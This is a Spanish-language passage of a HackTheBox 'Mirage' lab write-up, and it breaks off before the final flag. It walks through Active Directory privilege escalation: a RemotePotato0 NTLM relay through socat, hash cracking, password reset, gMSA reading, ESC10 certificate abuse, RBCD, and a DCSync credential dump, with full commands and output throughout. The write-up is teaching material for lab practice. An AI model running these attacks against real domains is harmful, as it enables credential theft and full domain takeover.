
~~~ bash
getTGT.py mirage.htb/nathan.aadam:'3edc#EDC3' -dc-ip dc01.mirage.htb
~~~

Nos conectaremos utilizando autenticación `kerberos` de la siguiente forma

~~~ bash
KRB5CCNAME=nathan.aadam.ccache evil-winrm-py -i dc01.mirage.htb -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.mirage.htb:5985' as 'nathan.aadam@MIRAGE.HTB'
evil-winrm-py PS C:\Users\nathan.aadam\Documents> whoami
mirage\nathan.aadam
~~~

En este punto ya podremos ver la flag del usuario sin privilegios

~~~ bash
evil-winrm-py PS C:\Users\nathan.aadam\Documents> type ..\Desktop\user.txt
967...
~~~
<br>


# Escalada de Privilegios
---
## Cross-Session Relay - `RemotePotato0`

Luego de una enumeración manual, podemos ver dos procesos que se ejecutan con el valor de `Session ID` en `1`. Esto significa que hay un usuario con una sesión interactiva iniciada

``` powershell
evil-winrm-py PS C:\Users\nathan.aadam\Documents> Get-Process | Where-Object { $_.SI -gt 0 }

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    277      15     2068       6232               540   1 csrss
    366      15     3240      15256              5324   1 ctfmon
    752      36    24552      54472               324   1 dwm
   1604      63    26224      92124              5620   1 explorer
     39       7     1692       4632              3752   1 fontdrvhost
    165      11     2352      14720              6084   1 RuntimeBroker
    315      16     5220      22652              6164   1 RuntimeBroker
    224      12     2204      13200              6396   1 RuntimeBroker
    674      35    31508      62680              5300   1 SearchApp
    499      17     4988      26780              4524   1 sihost
    581      28    13856      55072              5928   1 StartMenuExperienceHost
    325      17     5124      26332              1140   1 svchost
    197      12     2452      15828              1876   1 svchost
    219      13     2788      13496              4476   1 svchost
    189      12     2148      12148              5132   1 taskhostw
    546      23    10056      43120              5960   1 TextInputHost
    129      10     1664       7076              3304   1 vm3dservice
    245      18     4996      16168              6648   1 vmtoolsd       
    276      14     2928      12540               612   1 winlogon 
```

### Logged-in Users

Para obtener información sobre las sesiones activas en el sistema, podemos usar el comando [`qwinsta`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/qwinsta). Sin embargo, obtendremos un error cuando lo ejecutamos a través de `WinRM`

``` bash
evil-winrm-py PS C:\Users\nathan.aadam\Documents> qwinsta
No session exists for *
```

Esto ocurre debido al funcionamiento del protocolo `WinRM` cuando nos conectamos al DC, donde cada comando se ejecuta de forma [aislada](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security?view=powershell-7.5#process-isolation), bajo un proceso del servicio `WinRM`.

Frente a esta limitación, surge la necesidad de ejecutar comandos que contengan las credenciales explícitas del usuario. Podemos usar la funcionalidad [`PSCredential`](https://learn.microsoft.com/es-es/powershell/scripting/security/remoting/ps-remoting-second-hop?view=powershell-7.5#pass-credentials-inside-an-invoke-command-script-block) o herramientas como `Runas.exe`

``` bash
evil-winrm-py PS C:\Programdata> upload RunasCs.exe .
evil-winrm-py PS C:\Programdata> .\RunasCs.exe foo bar qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console           mark.bbond                1  Active
```

- `-l 9`: Iniciar un token con nuevas credenciales (`NewCredentials`), lo suficiente para procesar el comando como un usuario autenticado, pero sin iniciar sesión localmente.

Ahora veremos que el usuario `mark.bbond` tiene la sesión `1` activa en el DC, podemos intentar aprovechar esto para hacer un relay con la herramienta `RemotePotato0.exe`

### Understanding Attack

La herramienta [`RemotePotato0.exe`](https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2) utiliza una técnica conocida como `Token Impersonation`, y en este contexto se basa en abusar del servicio de activación DCOM para forzar autenticación NTLM de cualquier usuario que se encuentre con una sesión activa en ese momento.

Para entender un poco más este ataque, necesitaremos comprensión de los siguientes componentes que interactúan durante él:

> - `DCOM`: El Modelo de objetos componentes distribuidos (`DCOM`) es el protocolo de Microsoft para crear objetos remotos llamados objetos `COM` y llamar a sus métodos. Se implementa sobre `MSRPC`.
> 
> - `OXID Resolution`: La resolución `OXID` es el proceso de obtener la información de enlace de llamada a procedimiento remoto (`RPC`) necesaria para comunicarse con el exportador de objetos. Se puede considerar como un `DNS` para encontrar objetos `COM`.
> 
> - `Marshalling`: El `Marshalling` u ordenación resuelve la necesidad de pasar datos de una instancia de objeto `COM` a otra en un equipo diferente.
> 
> - `Session 0`: Cada usuario que inicia sesión en una máquina Windows obtiene una nueva sesión. La sesión `0` es la sesión inicial que se crea al iniciar el sistema y ejecuta la mayoría de los servicios.
{: .notice--info}

El atacante ejecuta una llamada `DCOM` especificando un CLSID vulnerable y lo inicializa con un objeto que apunta a un solucionador `OXID` falso del atacante.

El procesamiento de este objeto manipulado desencadena una solicitud a nuestro solucionador `OXID`, quien retorna enlaces `RPC`al falso servidor que levanta la herramienta (en el puerto `9997`).

En este punto, el servidor `COM` que se hace pasar por el administrador del dominio inicia autenticación NTLM hacia el servidor `RPC` falso, el resultado de todo este proceso sería un hash `NetNTLMv2`. Podemos encontrar más detalles técnicos en el siguiente [blog](https://www.safebreach.com/blog/remotepotato0-a-complex-active-directory-attack/)

### Exploiting

En nuestra máquina atacante, configuraremos `socat` para que actúe como un `RPC Endpoint Mapper`, y cuando recibamos la autenticación, esa conexión sea reenviada al DC por el puerto `9999`, el cual corresponde al servidor `RPC` falso que gestiona la conexión NTLM

``` bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999
```

Lanzaremos la herramienta `RemotePotato.exe` nuevamente, obtendremos el hash `NetNTLMv2` del usuario `mark.bbond`

``` bash
evil-winrm-py PS C:\Programdata> upload RemotePotato0.exe .
evil-winrm-py PS C:\Programdata> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.217

[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector: 
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client	: DC01
NTLMv2 Username	: MIRAGE\mark.bbond
NTLMv2 Hash	: mark.bbond::MIRAGE:c628e29bb6304195:ef9899110d2c6f2e49c0dc70c927f8d0:0101000000000000ae64cab6895fdc0172de0338abfd12c50000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800ae64cab6895fdc0106000400060000000800300030000000000000000100000000200000bfab203a4f47b2636a2d41b73c7385c85534410507e6c36eebeea528df6ed30d0a00100000000000000000000000000000000000090000000000000000000000
```


## Hash Cracking

Guardaremos el hash en un archivo e intentaremos descifrarlo de forma off-line con herramientas como `john` o `hashcat`

~~~ bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt

Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
1day@atime       (mark.bbond)
1g 0:00:00:01 DONE (2025-11-27 07:37) 0.5813g/s 642734p/s 642734c/s 642734C/s 1defebrero..1dani3ll3
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
~~~

Obtuvimos la contraseña para el usuario `mark.bbond`. Podemos validar estas credenciales con `netexec` en el dominio

``` bash
nxc smb dc01.mirage.htb -u mark.bbond -p '1day@atime' -k

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime
```


## Abusing AD ACLs - `ForceChangePassword` Rights

El usuario `mark.bbond` es miembro del grupo `IT_SUPPORT`, el cual posee derechos `ForceChangePassword` sobre `javier.mmarshall`. Esto le permite forzar un cambio de contraseña de la cuenta objetivo

![image-center](/assets/images/posts/mirage-7-hackthebox.png)
{: .align-center}

Como estamos en un entorno que solo usa `kerberos`, solicitaremos un TGT para el usuario `mark.bbond`

~~~ bash
getTGT.py mirage.htb/mark.bbond:'1day@atime' -dc-ip dc01.mirage.htb
 
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
~~~

Utilizaremos el ticket para cambiar la contraseña de `javier.mmarshall` utilizando herramientas como `bloodyAD`, `rpcclient` o `net`

~~~ bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 set password javier.mmarshall 'Password123!'

[+] Password changed successfully!
~~~

### Enabling User

Si intentamos validar las nuevas credenciales, obtendremos el siguiente error `kerberos`

~~~ bash
nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123!' -k

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123$ KDC_ERR_CLIENT_REVOKED
~~~

El error [`KDC_ERR_CLIENT_REVOKED`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#table-2-kerberos-ticket-flags:~:text=KDC%5FERR%5FCLIENT%5FREVOKED) error nos dice que la cuenta ha sido revocada, esto puede haber sido causado por varias razones, algunas de las cuales se deben a que la cuenta ha sido deshabilitada u otras causas relacionadas con alguna política restrictiva.

Si consultamos al usuario dentro de `Bloodhound` veremos claramente que la cuenta está deshabilitada

![image-center](/assets/images/posts/mirage-8-hackthebox.png)
{: .align-center}

Además podemos confirmarlo con la herramienta `bloodyAD`, el usuario posee la flag `ACCOUNTDISABLE`

``` bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 get object javier.mmarshall --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

Habilitaremos al usuario `javier.mmarshall` quitando este atributo restrictivo

``` bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 remove uac javier.mmarshall -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
```

Pero si volvemos a intentar autenticarnos como `javier.mmarshall`, obtendremos el mismo error

``` bash
nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123!' -k

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123$ KDC_ERR_CLIENT_REVOKED
```

### Logon Hours

Al consultar los atributos de la cuenta `javier.mmarshall`, notaremos que no tiene configurado el atributo `logonHours`.

> Las **`logonHours`** (Horas de Inicio de Sesión) son una configuración de seguridad en Active Directory que permite a los administradores **restringir las horas y días de la semana** en los que una cuenta de usuario específica puede iniciar sesión en la red o acceder a servicios.
{: .notice--info}

``` bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 get object javier.mmarshall --attr logonHours,userAccountControl 

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours: 
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

Esto significa que la cuenta `javier.mmarshall` no puede iniciar sesión en ningún horario. Al comparar el atributo con el de otro usuario del dominio, veremos la diferencia y la estructura que este valor debería tener

``` bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 get object mark.bbond --attr logonHours

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
logonHours: ////////////////////////////
```

El atributo `Logon Hours` se compone de un array de `21` bytes, dividiéndose en `7` bloques de `3` bytes

``` bash
echo '////////////////////////////' | base64 -d | xxd
00000000: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff ff                             .....
```

Podemos utilizar el valor de otro usuario del dominio que sabemos que no cuenta con esta restricción

``` bash
KRB5CCNAME=mark.bbond.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 set object javier.mmarshall logonhours -v '////////////////////////////' --b64 
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] javier.mmarshall's logonHours has been updated
```

Ahora que quitamos todas las restricciones, validaremos la nueva contraseña para el usuario `javier.mmarshall`

``` bash
nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123!' -k   

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\javier.mmarshall:Password123!
```


## Abusing AD ACL Rights - `ReadGMSAPassword`

El usuario `javier.mmarshall` posee el derecho `ReadGMSAPassword` sobre la cuenta `Mirage-Service$`, esto le permite leer el atributo `msDS-`

![image-center](/assets/images/posts/mirage-9-hackthebox.png)
{: .align-center}

La cuenta `Mirage-Service$` es una cuenta `gMSA` (`Group Managed Service Account`), este tipo de cuentas es gestionada por el DC, quien cambia y maneja sus credenciales de forma automática periódicamente.

Podemos obtener la contraseña de esta cuenta rápidamente con la herramienta `netexec`, la cual automatiza la lectura del atributo 

``` bash
nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123!' -k --gmsa

LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\javier.mmarshall:Password123! 
LDAP        dc01.mirage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.mirage.htb 389    DC01             Account: Mirage-Service$      NTLM: edb5e64a04fe919e5c3fa6bfbf3c54d9     PrincipalsAllowedToReadPassword: javier.mmarshall
```

Si no nos gusta `netexec` por algún motivo, podemos igualmente usar `bloodyAD`

```
getTGT.py mirage.htb/javier.mmarshall:'Password123!' -dc-ip dc01.mirage.htb

KRB5CCNAME=javier.mmarshall.ccache bloodyAD -d mirage.htb -k --host dc01.mirage.htb --dc-ip 10.10.11.78 get object 'Mirage-Service$' --attr msDS-ManagedPassword

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NT: edb5e64a04fe919e5c3fa6bfbf3c54d9
msDS-ManagedPassword.B64ENCODED: L5S7UOHHTGB8Hu958fHOYWaBaesdhkWf7FSCcbJWXLvpdfUBc/G2H36sVtjarfzwSFf3rv8+5TTBaZjd1TnFmuOM7E+QUATNbdGjpsU2bZvsVQZFXAWf02nt7dd8R7r89jc6QZxPImZ11NrUQp2L5H7IpqYU7Q7bnPlsnKdyAS0RQJZWyWHMo/x2wLqpr4rmO4sF1ITPxBrMppyjqzaj1a4eyS41ymBco9M2tjd2AtGJnxLcmd5ikn0kgmU8IOcHGrm49zjWgAbX6X52g3YWZgz8N1+LsI4bHLMmJn916jWHStjzSXiujYZza/RsMcaeGg+vmn8lUdio0gpNFCnBzQ==
```

Si desconfiamos porque ya no caemos en las mentiras de ella, podemos validar este hash con `netexec`

``` bash
nxc smb dc01.mirage.htb -u 'Mirage-Service$' -H 'edb5e64a04fe919e5c3fa6bfbf3c54d9' -k

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\Mirage-Service$:edb5e64a04fe919e5c3fa6bfbf3c54d9
```


## Abusing AD CS - `ESC10` Technique

Enumeraremos el servicio AD CS en busca de plantillas vulnerables que podamos explotar con técnicas conocidas.

``` bash
getTGT.py mirage.htb/'Mirage-Service$' -hashes :edb5e64a04fe919e5c3fa6bfbf3c54d9 -dc-ip dc01.mirage.htb

KRB5CCNAME=Mirage-Service\$.ccache certipy find -k -no-pass -target dc01.mirage.htb -dc-ip 10.10.11.78 -vulnerable -stdout

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'mirage-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'mirage-DC01-CA'
[*] Checking web enrollment for CA 'mirage-DC01-CA' @ 'dc01.mirage.htb'
[!] Error checking web enrollment: [Errno 61] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 61] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : mirage-DC01-CA
    DNS Name                            : dc01.mirage.htb
    Certificate Subject                 : CN=mirage-DC01-CA, DC=mirage, DC=htb
    Certificate Serial Number           : 1512EEC0308E13A146A0B5AD6AA741C9
    Certificate Validity Start          : 2025-07-04 19:58:25+00:00
    Certificate Validity End            : 2125-07-04 20:08:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MIRAGE.HTB\Administrators
      Access Rights
        ManageCa                        : MIRAGE.HTB\Administrators
                                          MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Enterprise Admins
        ManageCertificates              : MIRAGE.HTB\Administrators
                                          MIRAGE.HTB\Domain Admins
                                          MIRAGE.HTB\Enterprise Admins
        Enroll                          : MIRAGE.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

No encontramos ninguna plantilla con vulnerabilidades utilizando `certipy`

### Understanding Vulnerability

Para entender cómo funciona este ataque a nivel técnico, necesitaremos comprender sobre [`Certificate Mapping`](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-mapping).

Las vulnerabilidades `ESC10` se deben a configuraciones inseguras de la forma en la que `Schannel` asigna los certificados de cliente a cuentas del dominio.

> `Schannel` es el paquete de compatibilidad para seguridad (`SSP`) de Microsoft que implementa los protocolos SSL (`Secure Sockets Layer`) y TLS (`Transport Layer Security`) para asegurar las comunicaciones en Windows.
{: .notice--info}

`Schannel` es utilizado en contextos de Active Directory para establecer comunicaciones seguras en servicios como `LDAPS`, `HTTPS`, etc. Su comportamiento en AD CS depende de la configuración de la clave de registro `CertificateMappingMethods`.

Si esta clave está configurada para admitir la asignación basada en `UPN` (indicada con el bit `0x4` en el valor `DWORD`), un atacante podría aprovechar esto para escalar privilegios al emitir un certificado privilegiado modificando el atributo `UPN` de una cuenta del dominio.

> Para poder ejecutar esta técnica, el atacante necesita tener control sobre el atributo `UPN` de una cuenta del dominio, y esta cuenta debe poder solicitar certificados de autenticación de cliente (`ClientAuthentication`).
{: .notice--warning}

Cuando confirmamos esta información, podemos:

- Modificar el atributo `UPN` de la cuenta víctima para que coincida con el `sAMAccountName` de una cuenta privilegiada o de un host crítico (como la cuenta de equipo del `DC`).
- Solicitar un certificado de autenticación de cliente con el usuario víctima y usarlo para autenticarse en LDAPS.
- Revertir el cambio de `UPN` para evitar conflictos y restablecer la funcionalidad normal.
- Autenticación en el DC con el certificado privilegiado hacia el servidor LDAP sobre TLS (`LDAPS`) como `DC$`, lo cual puede desencadenar configurar RBCD o leer información LDAP sensible.

> El campo `SAN` (`Subject Alternative Name`) es una extensión del certificado que permite asociar múltiples identidades (`DNS`, correos, o `UPN`) al certificado.
{: .notice--info}

Podemos consultar la wiki de [`certipy`](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication) para conocer cómo se explota esta vulnerabilidad

> `certipy` no detecta `ESC10` directamente, porque no tiene acceso a enumerar la clave de registro `CertificateMappingMethods`.
{: .notice--danger}

Desde la sesión de `powershell` que tenemos como `nathan.aadam`, podemos consultar el valor de la clave de registro `CertificateMappingMethods` sin necesidad de tener privilegios.

~~~ powershell
evil-winrm-py PS C:\Users\nathan.aadam\Documents> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
~~~

Además, de la enumeración anterior, veremos que la plantilla `User` se encuentra activa. Esta plantilla permite autenticación de cliente (`ClientAuthentication`).

``` bash
Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : mirage-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    ...
    <SNIP>
    ...
```

### Exploiting

Como necesitamos modificar el atributo `UPN` de un usuario del dominio, podemos enumerar con la cuenta `Mirage-Service` permisos de escritura

``` bash
distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb

...
<SNIP>
...
userPrincipalName: WRITE
...
<SNIP>
...
```

Tenemos permisos de escritura sobre muchos atributos del usuario `mark.bbond`, incluyendo el que necesitamos.

Modificaremos el `UPN` de esta cuenta para que coincida con el valor de la cuenta de equipo del DC

~~~ bash
KRB5CCNAME=Mirage-Service\$.ccache certipy account update  -u 'mirage-service$@mirage.htb' -k -no-pass -user 'mark.bbond' -upn 'dc01$@mirage.htb' -dc-ip 10.10.11.78 -target dc01.mirage.htb

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
~~~

Ahora debemos solicitar un certificado usando la plantilla `User` para el usuario `mark.bbond`

~~~ bash
KRB5CCNAME=mark.bbond.ccache certipy req -u 'mark.bbond@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User'
 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 29
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
~~~

Revertiremos los cambios para evitar problemas a la hora de usar el certificado

~~~ bash
KRB5CCNAME=Mirage-Service\$.ccache certipy account update  -u 'mirage-service$@mirage.htb' -k -no-pass -user 'mark.bbond' -upn 'mark.bbond@mirage.htb' -dc-ip 10.10.11.78 -target dc01.mirage.htb
 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
~~~

Finalmente, nos autenticaremos con el certificado obtenido para conectarnos al servidor LDAPS

~~~ bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# 
~~~


### Setting `Resource-Based Constrained Delegation` (RBCD)

Dentro de esta shell, podemos modificar la configuración de la delegación `kerberos` para habilitar RBCD

~~~ bash
# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy
~~~

Ahora en teoría podremos abusar de RBCD para obtener un ticket de servicio privilegiado, si intentamos con `Administrator` obtendremos un error, por lo que podemos optar por `DC01$`

~~~ bash
KRB5CCNAME=Mirage-Service\$.ccache impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78 'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
~~~


## DC Sync

Como tenemos un ticket privilegiado, podemos aprovecharlo para volcar las base de datos `NTDS.DIT` y obtener todos los hashes de los usuarios del dominio, incluyendo `Administrator`

~~~ bash
KRB5CCNAME=dc01\$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache secretsdump.py -k -no-pass dc01.mirage.htb -dc-ip 10.10.11.78 -just-dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:edb5e64a04fe919e5c3fa6bfbf3c54d9:::
...
<SNIP>
...
~~~

Ya con todos los hashes NTLM, podemos simplemente solicitar un TGT como `Administrator`

~~~ bash
getTGT.py mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip dc01.mirage.htb 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
~~~


## Root Time

Ya podremos usar el ticket para conectarnos como `Administrator` al DC

~~~ bash
KRB5CCNAME=Administrator.ccache evil-winrm-py -i dc01.mirage.htb -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.mirage.htb:5985' as 'Administrator@MIRAGE.HTB'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
mirage\administrator
~~~

Solo nos queda ver la flag del sistema ubicada en el escritorio de `Administrator`

~~~ bash
